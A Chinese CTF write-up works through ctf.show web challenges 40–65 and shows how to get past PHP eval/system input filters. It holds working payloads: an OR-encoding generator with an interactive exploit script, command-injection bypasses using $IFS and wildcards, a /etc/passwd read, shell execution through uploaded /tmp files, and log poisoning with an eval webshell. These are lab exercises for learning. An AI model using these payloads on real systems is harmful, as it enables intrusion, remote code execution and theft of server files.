● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。

● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名

● dirname(chdir(dirname()))配合切换文件路径查看和读取根目录文件

### *web40
题目


```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```


题中屏蔽了中文/( 和 /) 


<details>
<summary>无参数函数</summary>

localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.

scandir() 列出 images 目录中的文件和目录。

readfile() 输出一个文件。

current() 返回数组中的当前单元, 默认取第一个值。

pos() 是current() 的别名。

next() 函数将内部指针指向数组中的下一个元素，并输出。

array_reverse()以相反的元素顺序返回数组。

highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。

current(localeconv()) 永远都是个点

var_dump() 是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。

</details>


<strong>分析提示：?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</strong>

+ <strong>`localeconv()`</strong>：这个函数返回当前本地环境的各种格式设置（如货币符号、数字格式等）。在这里，它的返回值是一个包含设置项的数组。
+ <strong>`pos(localeconv())`</strong>：`pos()` 函数将数组指针移动到数组的第一个元素并返回它。所以，`pos(localeconv())` 会返回 `localeconv()` 返回的数组的第一个值。
+ <strong>`scandir()`</strong>：`scandir()` 函数用于列出指定路径下的所有文件和目录。这里传入的路径是 `pos(localeconv())`，这意味着它会列出与 `localeconv()` 返回值相关的目录内容。
+ <strong>`array_reverse()`</strong>：这个函数将数组顺序反转。它将 `scandir()` 返回的文件和目录列表的顺序反转。
+ <strong>`next()`</strong>：`next()` 函数将数组指针向前移动一位，并返回当前指针指向的值。这里它会返回反转后的 `scandir()` 数组中的第二个元素。
+ <strong>`show_source()`</strong>：这个函数显示指定文件的源代码。通过 `show_source(next(...))`，攻击者可以试图查看服务器上的某个文件的源代码。

#### 整体分析
按照 <strong>PHP 的运算规则</strong>，从最内层函数开始分析：

<strong>1. </strong><strong>`localeconv()`</strong>

+ 该函数返回一个包含 <strong>本地货币格式信息</strong> 的关联数组（`array`）。

---

<strong>2. </strong><strong>`pos(localeconv())`</strong>

+ `pos()` 是 `current()` 的别名，返回 <strong>数组的当前值</strong>。
+ `localeconv()` 返回的是一个数组，而 `pos()` 会取数组的第一个值，通常是 <strong>"."（小数点）</strong>。

<strong>此时，</strong><strong>`pos(localeconv())`</strong><strong> 的值通常是 </strong><strong>`"."`</strong><strong>（字符串）。</strong>

---

<strong>3. </strong><strong>`scandir(pos(localeconv()))`</strong>

+ `scandir()` 用于获取 <strong>指定目录的文件列表</strong>。
+ 由于 `pos(localeconv())` 返回 `"."`，即当前目录，所以 `scandir(".")` 会列出当前目录下的所有文件和文件夹。

<strong>示例返回值（假设当前目录包含 </strong><strong>`index.php`</strong><strong>、</strong><strong>`flag.php`</strong><strong>、</strong><strong>`uploads`</strong><strong> 文件夹）：</strong>


```php
php


复制编辑
Array (
    [0] => "."
    [1] => ".."
    [2] => "index.php"
    [3] => "flag.php"
    [4] => "uploads"
)
```


---

<strong>4. </strong><strong>`array_reverse(scandir(pos(localeconv())))`</strong>

+ `array_reverse()` 反转数组，使得目录列表倒序排列：


```php
php


复制编辑
Array (
    [0] => "uploads"
    [1] => "flag.php"
    [2] => "index.php"
    [3] => ".."
    [4] => "."
)
```


此时，数组的第一个元素变成 `"uploads"`（假设它原本在最后）。

---

<strong>5. </strong><strong>`next(array_reverse(scandir(pos(localeconv()))))`</strong>

+ `next()` 函数返回数组的 <strong>下一个元素</strong>，即 `flag.php`（如果它存在）。
+ <strong>最终，</strong><strong>`next(...)`</strong><strong> 可能返回 </strong><strong>`"flag.php"`</strong>。

---

<strong>6. </strong><strong>`show_source(next(...))`</strong>

+ `show_source("flag.php")` 相当于 `highlight_file("flag.php")`，会在 <strong>网页上高亮显示 </strong><strong>`flag.php`</strong><strong> 文件的源代码</strong>。


### web41
[exp.py](https://www.yuque.com/attachments/yuque/0/2025/py/49819380/1739175897113-3659873a-1846-4be9-9858-682b17065e6e.py)

[rce_or.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/49819380/1739175904035-cd25afcd-e9e8-4cf7-87cc-ffc3041ab061.txt)

> 先通过以下 php 脚本生成一个 rce_or.txt，内容是上述可用字符及编码。
>
> rce_or.php 内容：
>


```php
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```


大体意思就是从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。

再通过以下自动化脚本传参并执行想执行的命令。  
到这一步其实就是用 python 主动提交 payload。

用法：<span style="color: rgb(216, 59, 100)"><strong>`python exp.py url地址`</strong></span>

exp.py 代码：


```php
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os


os.system("php rce_or.php")  #没有将php写入环境变量需手动运行

if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
   
url=argv[1]


def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)
```


可以如下图先运行 php 脚本先生成 txt 文件。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-043.webp)

然后运行 python 脚本。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-044.webp)

最后输入相应指令即可获得 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-045.webp)


### /dev/null详解
Shell脚本———— /dev/null 2>&1详解  
1、可以将/dev/null看作"黑洞". 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.   
用处:   
禁止标准输出.    1 cat \$filename >/dev/null   # 文件内容丢失，而不会输出到标准输出.   
禁止标准错误.    2>/dev/null 这样错误信息`[标准错误]`就被丢到太平洋去了. 

2、1>/dev/null 2>&1的含义 

> 代表重定向到哪里，例如：echo "123" > /home/123.txt   
1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于"1>/dev/null"   
2 表示stderr标准错误   
& 表示等同于的意思，2>&1，表示2的输出重定向等同于1 
>

那么本文标题的语句：   
1>/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。   
2>&1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 

3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 

下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。   
dd if=/dev/zero of=file count=10 bs=1024


shell中可能经常能看到：>/dev/null 2>&1 

命令的结果可以通过%>的形式来定义输出

分解这个组合：“>/dev/null 2>&1” 为五部分。

<strong>1：> 代表重定向到哪里，例如：echo "123" > /home/123.txt  
2：/dev/null 代表空设备文件  
3：2> 表示stderr标准错误  
4：& 表示等同于的意思，2>&1，表示2的输出重定向等同于1  
5：1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于 "1>/dev/null"</strong>

因此，>/dev/null 2>&1 也可以写成“1> /dev/null 2> &1”

那么本文标题的语句执行过程为：  
1>/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。  
2>&1 ：接着，标准错误输出重定向 到 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。

最常用的方式有：

command > file 2>file  与command > file 2>&1

它们有什么不同的地方吗？  
      首先command > file 2>file 的意思是将命令所产生的标准输出信息,和错误的输出信息送到file 中.command  > file 2>file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file 的管道。  
      而command >file 2>&1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file 只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容。  
      从IO效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,较多的时候我们会command > file 2>&1 这样的写法。

[https://www.cnblogs.com/tinywan/p/6025468.html](https://www.cnblogs.com/tinywan/p/6025468.html)

### web42
要让命令回显，可以进行命令分隔，以此来绕过：


```php
;     分号
|     只执行后面那条命令
||    只执行前面那条命令
&     两条命令都会执行
&&    两条命令都会执行
```


<strong>?c=tac flag.php;</strong>

### web43
该题在web42的基础上过滤了   ;  cat

此题需使用分隔符 		 即：&&(%26%26) 或  回车(%0a) 或||(%7C%7C)等等

?c=tac flag.php %26%26 ls

<strong>为什么要编码？</strong>  
编码是为了防止 URL 中的特殊字符（如 `&`、`=`, 等）被误解为分隔符或其他控制字符，确保它们在传递给服务器时能够按照预期的方式处理。  

### web44
使用通配符即可 与上面题类似

<strong>?c=tac f* %26%26 ls</strong>

### web45（空格绕过）
在上题的基础上多过滤了空格

使用水平制表符替代即可 %09(Tab)

<strong>?c=tac%09f*%26%26ls</strong>

linux适用空格绕过：

<、<>、%20（space）、%09（tab）、\$IFS\$9、\${IFS}、\$IFS、{cat,/etc/passwd}、%0a（回车）

<strong>`$IFS`</strong><strong> 和 </strong><strong>`$IFS$9`</strong><strong>（Internal Field Separator）</strong>

+ <strong>`$IFS`</strong> 是 <strong>内部字段分隔符</strong>，在 Bash 中，它定义了命令行输入中的字段分隔符。默认情况下，`$IFS` 是空格、Tab 和换行符。攻击者可以利用这个变量来分隔命令中的不同部分，绕过过滤器。

<strong>`$9`</strong> 通常表示命令行参数中的第 9 个参数，`$IFS$9` 表示通过 IFS 分隔符与第 9 个参数结合，可能用来进行进一步的命令注入。

<strong>`${IFS}`</strong>

+ `${IFS}` 是将 `IFS` 环境变量的内容替换成实际值。例如，`$IFS` 通常为空格、Tab 和换行符，可以用于命令的分隔。
+ 通过利用 `${IFS}`，攻击者可以在命令中插入分隔符，达到 <strong>绕过过滤</strong> 或 <strong>注入恶意命令</strong> 的目的。

<strong>`{cat, /etc/passwd}`</strong>

+ 这是一个命令扩展的形式，允许执行多个命令或命令参数的集合。在某些环境中，攻击者可以通过 `{}` 来组合命令，绕过常规的过滤。
+ 例如，`{cat,/etc/passwd}` 可以表示执行 `cat` 或 `cat /etc/passwd` 命令，取决于命令上下文。

<strong>`%0a`</strong><strong>（回车符的 URL 编码）</strong>

+ <strong>`%0a`</strong> 是 <strong>换行符（</strong><strong>`\n`</strong><strong>）</strong> 的 URL 编码。
+ 换行符通常用来分隔命令或命令参数。在命令注入时，攻击者可能通过 `%0a` 来强制执行多个命令。这样即使 `;` 被过滤，换行符依然能够分隔命令。

### web46
多过滤了* \$ 数字

使用通配符 ? 代替即可

<strong>?c=tac%09fla?.???%26%26ls</strong>或<strong>?c=tac%09f''ag.php%26%26ls</strong>

### web47
与上题可相同payload

多过滤了数字以及其他查看方法

<strong>?c=tac%09fla?.???%26%26ls</strong>

### web48
同上

### web49
多过滤了 %

同上 <strong>?c=tac%09fla?.???%26%26ls</strong>其中的%提交时会自动解码 不属于%

### web50
多过滤了 tab 键与 “ & ”。

可将&&换为|| 和 空格替换为<、<>、%20（space）、%09（tab）、\$IFS\$9、\${IFS}、\$IFS、{cat,/etc/passwd}、%0a（回车）

<strong>?c=tac<>fl<span style="color: rgb(163, 21, 21)">''</span>ag.php||ls	</strong>对||编码即可

<strong>?c=nl>fl''ag.php%7C%7Cls</strong>

执行后会显示1，右键查看源代码即可

<span style="color: #DF2A3F">这里插播一条知识点</span>

<span style="color: #DF2A3F">前面说过：空格可以用<>、< 绕过，</span>

<span style="color: #DF2A3F">关键字可以用? 、'' 、"" 、\ 绕过，</span>

<span style="color: #DF2A3F">但是< 和 <> 可以与 ''  ""  \ 任意组合，但不能与 ? 组合，原因不明</span>

### web51
注意：此题中的根目录已有的文件有fl?g.php fla?.php flag.php index.php 故不可用通配符 ?

相比上一题多过滤了 tac 命令。那换一个即可。

<strong>?c=nl<fl''ag.php%7C%7Cls</strong>

执行后会显示1，右键查看源代码即可

### web52
法一：

过滤了<> 但去掉了\$

<strong>?c=nl\${IFS}fla''g.php%7C%7Cls</strong>

发现flag.php是假的

<strong>?c=ls\${IFS}/%7C%7Cls</strong>

扫一下根目录发现flag文件

<strong>?c=nl\${IFS}/fla''g%7C%7Cls</strong>

获得flag

法二：

该题还可用mv 或 cp将根目录下的flag转到var/www/html下的txt文件

### web53
该题参数执行命令改变


```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```


已知system函数成功则返回执行结果的最后一行，失败则返回false

且此题不在需要命令分段符

<strong>?c=nl\${IFS}fla''g.php</strong>即可

### web54

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}

```


其中|.*f.*l.*a.*g.*|这种过滤说明字母不能按过滤顺序出现，但该题未过滤通配符 ?

且该题不能用cp命令 因为过滤了|.*s.*c.*p.*|

可用重命名mv

法一：

<strong>mv\${IFS}f???.php\${IFS}a.txt</strong>

<strong>a.txt</strong>

法二：

<strong>?c=/bin/?at\${IFS}f???.php</strong>直接访问

法三：

此题未过滤vi命令

<strong>?c=vi\${IFS}f???.php</strong>

vi命令	可直接vi filename.txt编辑文件

### web55

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```


这一题将字母全部过滤了，没有过滤空格和通配符 “ ? ”

法一：

由于未过滤数字，利用 /bin/ 目录下的 <span style="color: rgb(216, 59, 100)"><strong>`base64`</strong></span> 进行通配符匹配。获得 flag.php 文件的 base64 编码。

<strong>?c=/???/????64 ????.???</strong>

再将显示内容用base64解码即可  
 法二：

利用 /usr/bin/ 下的 <span style="color: rgb(216, 59, 100)"><strong>`bzip2`</strong></span> 命令，先将 flag.php 文件进行压缩，然后再将其下载。（bzip2 命令压缩后的文件以 “ <strong>.bz2</strong> ” 为后缀）

压缩文件：<strong>?c=/???/???/????2 ????.???</strong>

这时已将 flag.php 压缩为 flag.php.bz2。直接通过 url 访问下载。  
<strong>url + flag.php.bz2</strong> 解压打开即可

法三：

[无字母数字webshell](https://blog.csdn.net/qq_46091464/article/details/108513145)

构造一个 post 请求并上传文件。由于没有过滤 “ . ”（点），所以通过执行文件中的 Linux 命令获取 flag。

先创建一个 html 文件，内容如下，url 换成相应网址即可：（注意仅可http）


```php
<!--构造一个post上传文件的数据包，这是个上传页面，选择文件上传-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://dc1bfe3e-910b-4ad5-9130-db7f0cd7cca4.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```


界面如下：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-046.webp)

配置 burpsuit 代理后，随便上传一个文件后提交。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-047.webp)

构造 poc 执行命令：


```php
在 burp 拦截中，通过 GET 方式传递：
?c=.+/???/????????[@-[]

并在上传文件内容添加sh命令：
#!/bin/sh
pwd
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-048.webp)

再看一下当前目录有哪些文件：


```php
#!/bin/sh
ls
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-049.webp)

直接读取：


```php
#!/bin/sh
cat /var/www/html/flag.php
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-050.webp)

到手。

了解之后，这个方法其实并不难理解。知识 + 1。

<strong>原理</strong>

+ x09 为 tab键。x26为 “ & ”。
+ Linux 系统下 php 接收上传文件的 post 包，默认会将文件保存在临时文件夹 /tmp/，文件名 phpXXXXXX。
+ Linux 中 <span style="color: rgb(216, 59, 100)"><strong>`.`</strong></span>（点）命令，或者叫 period，它的作用和 <span style="color: rgb(216, 59, 100)"><strong>`source`</strong></span> 命令一样，就是用当前的 shell 执行一个文件中的命令。
+ ascii 码表中，大写字母位于 “ @ ” 与 “ [ ” 之间。

### web56
知道 web55 的第三种解法后，这题也就不难了。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-051.webp)


```php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```


数字字母全过滤了。“ . ” 没有过滤。

那就用上一题的方法：

构造 post 请求上传文件。


```php
<!--构造一个post上传文件的数据包，这是个上传页面，选择文件上传-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://2cf3e5d1-4cba-41f5-bab0-af916511335b.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```


配置 burp 抓包并传递参数与文件内容。


```php
在 burp 拦截中，通过 GET 方式传递：
?c=.+/???/????????[@-[]

并在上传文件内容添加sh命令：
#!/bin/sh
ls
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-052.webp)

直接读取即可：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-053.webp)

<strong>原理</strong>

+ Linux 系统下 php 接收上传文件的 post 包，默认会将文件保存在临时文件夹 /tmp/，文件名 phpXXXXXX。
+ Linux 中 <span style="color: rgb(216, 59, 100)"><strong>`.`</strong></span>（点）命令，或者叫 period，它的作用和 <span style="color: rgb(216, 59, 100)"><strong>`source`</strong></span> 命令一样，就是用当前的 shell 执行一个文件中的命令。
+ ascii 码表中，大写字母位于 “ @ ” 与 “ [ ” 之间。

### \$(())的用法
<strong>\$()和 ` `  </strong>

在 bash shell 中，<strong><span style="color: #DF2A3F">\$( ) 与` `</span></strong> (反引号) 都可用做<strong><span style="color: #DF2A3F">命令替换</span></strong>用。


<strong>例如   </strong>

version=\$(uname -r)和version=`uname -r`都可以是version得到内核的版本号


<strong>各自的优缺点：</strong>

1. `  ` 基本上可用在全部的 unix shell 中使用，若写成 shell script ，其移植性比较高，但反单引号容易打错或看错。

2. \$()并不是所有shell都支持。


<strong>\${ } </strong>

\${ }用于<strong><span style="color: #DF2A3F">变量替换</span></strong>。<span style="color: #DF2A3F">一般情况下，\$var 与\${var} 并没有什么不一样</span>，但是用 \${ } 会比较精确的界定变量名称的范围。

<strong>例如</strong>

\$ A=B

\$ echo \$AB

原本是打算先将 \$A 的结果替换出来，然后再补一个 B 字母于其后，但在命令行上，真正的结果却是只会替换变量名称为 AB 的值出来…

若使用 \${ } 就没问题了：

\$ echo \${A}B

BB


<strong>\${ }的<span style="color: #DF2A3F">模式匹配</span>功能：</strong>

## 是去掉左边(在键盘上#在\$之左边)

% 是去掉右边(在键盘上%在\$之右边)

#和%中的单一符号是最小匹配，两个相同符号是最大匹配。


\${variable#pattern}：shell在variable中查找，看它是否以给定的模式pattern开始，如果是，就从命令行把variable中的内容去掉左边最短的匹配模式


\${variable##pattern}：shell在variable中查找，看它是否以给定的模式pattern开始，如果是，就从命令行把variable中的内容去掉左边最长的匹配模式


\${variable%pattern}：shell在variable中查找，看它是否以给定的模式pattern结尾，如果是，就从命令行把variable中的内容去掉右边最短的匹配模式


\${variable%%pattern}：shell在variable中查找，看它是否以给定的模式pattern结尾，如果是，就从命令行把variable中的内容去掉右边最长的匹配模式


这四种模式中都不会改变variable的值，其中，只有在pattern中使用了*匹配符号时，%和%%，#和##才有区别。结构中的pattern支持通配符，*表示零个或多个任意字符，?表示仅与一个任意字符匹配，`[...]`表示匹配中括号里面的字符，`[!...]`表示不匹配中括号里面的字符。


<strong>\$`[]` \$(()) </strong>

\$`[]`和\$(())是一样的，都是进行<strong><span style="color: #DF2A3F">数学运算</span></strong>的。支持+ - * / %（“加、减、乘、除、取模”）。但是注意，bash只能作整数运算，对于浮点数是当作字符串处理的。

例如：

\$ a=5; b=7; c=2

\$ echo \$(( a+b*c ))

19

\$ echo \$(( (a+b)/c ))

6

\$ echo \$(( (a*b)%c))

1


在 \$(( )) 中的变量名称，可于其前面加 \$ 符号来替换，也可以不用，如：

\$(( \$a + \$b * \$c)) 也可得到 19 的结果

此外，\$(( )) 还可作不同进位(如二进制、八进位、十六进制)运算，只是，输出结果皆为十进制而已：

echo \$((16#2a)) 结果为 42 (16进位转十进制)


<strong>`[ ]` </strong>

为test命令的另一种形式，但要注意：

1.必须在左括号的右侧和右括号的左侧各加一个空格，否则会报错。

2.test命令使用标准的数学比较符号来表示字符串的比较，而用文本符号来表示数值的比较。

3.大于符号或小于符号必须要转义，否则会被理解成重定向。


<strong>(( ))及[[ ]] </strong>

分别是`[ ]`的针对数学比较表达式和字符串表达式的加强版。

其中

[[ ]]中增加模式匹配特效；

(( ))不需要再将表达式里面的大小于符号转义，除了可以使用标准的数学运算符外，还增加了以下符号：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-054.webp)

### web57

```php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```


<strong>url + ?c=\$((\~\$((\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))))))</strong>

Linux Shell 中 <span style="color: rgb(216, 59, 100)"><strong>`$(())`</strong></span> 的用法。[相关信息](https://blog.csdn.net/u013402321/article/details/80333272)

简单来说，<span style="color: rgb(216, 59, 100)"><strong>`$(())`</strong></span> 用来做数学运算。且 <span style="color: rgb(216, 59, 100)"><strong>`$(())`</strong></span> 的值为 0。

<span style="color: rgb(216, 59, 100)"><strong>`~`</strong></span> 在 <span style="color: rgb(216, 59, 100)"><strong>`$(())`</strong></span> 中代表按位取反，即 <span style="color: rgb(216, 59, 100)"><strong>`$((~$(())))`</strong></span> 就是 0 取反，即 -1。

<span style="color: rgb(216, 59, 100)"><strong>`$(($((~$(())))$((~$(())))))`</strong></span> 也就是 \$((-1-1)) 为 -2。

### web58-60

```php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```


此题改用POST，所以将hackbar打开post模式

<strong>法一： </strong>  
传递 <strong>c=system(<span style="color: rgb(163, 21, 21)">'ls'</span>); </strong>发现 system() 函数被禁用了以及phpinfo()、shell_exec()...

<strong>c=echo file_get_contents('flag.php');</strong>	（59 60禁用）	使用file_get_contents()函数

<strong>c=show_source(<span style="color: rgb(163, 21, 21)">'flag.php'</span>); </strong>

<strong>c=highlight_file(<span style="color: rgb(163, 21, 21)">"flag.php"</span>);</strong>

<strong>法二：</strong>

<strong>c=include('flag.php');echo \$flag;</strong>

<strong>或者	c=include('flag.php');var_dump(get_defined查看源代码即可_vars());</strong>

<strong>法三：伪代码</strong>

<strong>c=include <span style="color: rgb(163, 21, 21)">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</strong>

也可将伪代码写在url中

<strong><span style="color: rgb(163, 21, 21)">?1=php://filter/read=convert.base64-encode/resource=flag.php</span></strong>

<strong><span style="color: rgb(163, 21, 21)">POST中写  c=include (\$_GET`[1]`);</span></strong>


<details>
<summary>解题思路</summary>

解题思路：

通过测试发现该类题目是disable_functions绕过，disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。（eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。）

黑名单绕过，难免会有遗漏的函数，我们可以查看phpinfo文件，看看是否有未被禁用的危险函数

如：dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link

读取文件函数：

<strong>file_get_contents()：</strong>将整个文件读入一个字符串（PHP4>=4.3.0,PHP5,PHP7,PHP8）

exp:<strong>c=echo file_get_contents("flag.php");</strong>

file():把整个文件读入一个数组中(PHP4,PHP5,PHP7,PHP8)

readfile():读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回FALSE并附带错误信息。您可以通过在函数名前面添加一个‘@’来隐藏错误输出。

exp:<strong>c=readfile("flag.php");</strong>

var_dump():输出变量的类型和值。它可以输出多种类型的变量，包括数字、字符串、数组、对象等。

exp:<strong>c=var_dump(file('flag.php'));</strong>

highlight_file():对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。

exp:<strong>c=highlight_file("flag.php");</strong>

show_source():用于返回突出显示PHP语法的文件,通过使用HTML标记突出显示语法。

exp:<strong>c=show_source("flag.php");</strong>

feof():函数检测是否已达到文件末尾（eof）。如果文件指针到了EOF或者出错时则反回TRUE，否则返回一个错误（包括socket超时），其它情况则返回FALSE。

exp:

<strong>c=\$a=fopen("flag.php","r");while (!feof(\$a)) {\$line = fgets(\$a);echo \$line;}</strong>  #一行一行读取

fgetcsv():从文件指针中读入一行并解析CSV字段，与fgets()类似，不同的是fgetcsv()解析读入的行并找出CSV格式的字段，然后返回一个包含这些字段的数组。fgetcsv()出错时反馈FALSE，包括碰到文件结束时。

exp:

<strong>c=\$a=fopen("flag.php","r");while (!feof(\$a)) {\$line = fgetc(\$a);echo \$line;}</strong>  #一行一个一个字符取

<strong>c=\$a=fopen("flag.php","r");while (!feof(\$a)) {\$line = fgetcsv(\$a);var_dump(\$line);}</strong>

#注当输入payload页面没有回显时，可通过查看源代码的方式得到flag

</details>


<strong>法四：shell执行</strong>

 在使用hackbar时先添加user-agent，在其栏中写入<strong>`<?php eval($_POST[a]);?>`</strong> 然后再关闭user-agent再在url码中添加<strong>?1=/var/log/nginx/access.log</strong> 又添加POST提交，在其栏写入<strong>c=include(\$_GET`[1]`);&a=highlight_file('flag.php');  </strong>

### web61-65
同上面一样，禁用相关函数

<strong>c=<span style="color: rgb(221, 74, 104)">highlight_file</span>("flag.php");</strong>

<strong>c=<span style="color: rgb(221, 74, 104)">show_source</span>("flag.php");</strong>

### web66-70
